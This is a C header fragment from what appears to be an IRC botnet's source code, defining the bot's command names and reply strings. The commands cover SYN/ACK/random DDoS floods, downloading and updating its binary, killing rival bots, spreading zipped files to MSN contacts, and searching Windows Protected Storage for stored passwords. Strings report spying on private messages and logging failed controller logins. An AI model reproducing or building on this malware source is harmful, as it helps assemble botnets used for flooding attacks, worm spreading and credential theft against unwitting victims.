//////////////////////
////// Commands //////
//////////////////////

const char get_auth[]				= "login";

#ifndef NO_LOGOUT_CMD
const char cmd_logout[]				= "logout";
#endif

#ifndef NO_REMOVE_CMD
const char cmd_remove[]				= "remove";
#endif

#ifndef NO_DDOS
const char cmd_ddos_syn[]			= "ddos.syn";
const char cmd_ddos_ack[]			= "ddos.ack";
const char cmd_ddos_random[]		= "ddos.random";
#endif

#ifndef NO_DOWNLOAD
const char get_mnd[]				= "get.download";
const char get_upd[]				= "get.update";
#endif

#ifndef NO_BOTKILLER
const char cmd_botkiller[]	= "botkiller";
#endif

#ifndef NO_IMSPREAD
const char cmd_imspread_1[]			= "msn.spread";
const char cmd_imspread_2[]			= "msn.msg";
const char cmd_imspread_3[]			= "msn.stats";
const char cmd_imspread_4[]			= "msn.addcontact";
#endif

#ifndef NO_VISIT
const char cmd_visit[]				= "visit";
#endif

#ifndef NO_PSTORE
const char cmd_pstore_1[]			= "pstore";
const char cmd_pstore_2[]			= "pstore.search";
#endif

#ifndef NO_FAKE_CMDS
const char cmd_fake_remove[]    	= "f.remove";
const char cmd_fake_download[]   	= "f.download";
const char cmd_fake_update[]     	= "f.update";
#endif


/////////////////////
////// Strings //////
/////////////////////

char str_auth_good[]			= "%s Welcome.";
char str_auth_full[]			= "%s Fail.";
char str_spy_privmsg[]			= "%s Spy: %s!%s@%s (PM: \"%s\")";
char str_auth_bad[]			= "%s Fail by: %s!%s@%s (Pass Tried: %s)";

char str_logout[]			= "%s %s out.";
char str_sl_logout[]			= "%s <%i> out.";
char str_sl_no_logout[]			= "%s No user at: <%i>";
char str_sl_in_logout[]			= "%s Invalid slot: <%i>";

char str_thread_stop[]			= "%s Kill: <%d> threads";
char str_thread_ac[]			= "%s No threads";
char str_thread_kill[]			= "%s Killed thread: <%s>";
char str_thread_fkill[]			= "%s Failed kt: <%s>";
char str_thread_alr[]			= "%s %s already running: <%d>.";
char str_thread_fail[]			= "%s Fail start %s, err: <%d>.";

char str_msn_spread[]	= "[msn]: Message & Zipfile sent to: %d contacts.";
char str_msn_msg[]		= "[msn]: Message sent to: %d Contacts.";
char str_msn_stat[]     = "[msn]: Sent Stats - Messages: %d :: Files: %d :: Message & Files: %d.";

char str_status[]			= "%s Status: %s. Box Uptime: %s, Bot Uptime: %s, Connected for: %s.";

char str_installed[]			= "%s Bot installed on: %s.";

char str_kick_msg[]			= "Go fuck yourself %s.";


char str_auth_ali[]			= "%s logged in.";
char str_quit_rem[]			= "Removed by: %s!%s@%s";
char str_quit_upd[]			= "gettin new bin .";
char str_noadvapi[]			= "%s Advapi.dll Failed";
char str_nopstore[]			= "%s PStore.dll Failed.";


char str_main_thread[]			= "%s Naim thd.";
char str_rup_thread[]			= "%s RuC.";
//char str_asecure_thread[]		= "%s Asec.";

char str_bad_format[]			= "%s mis param.";

char str_exip_resolve[] 		= "cant dns";
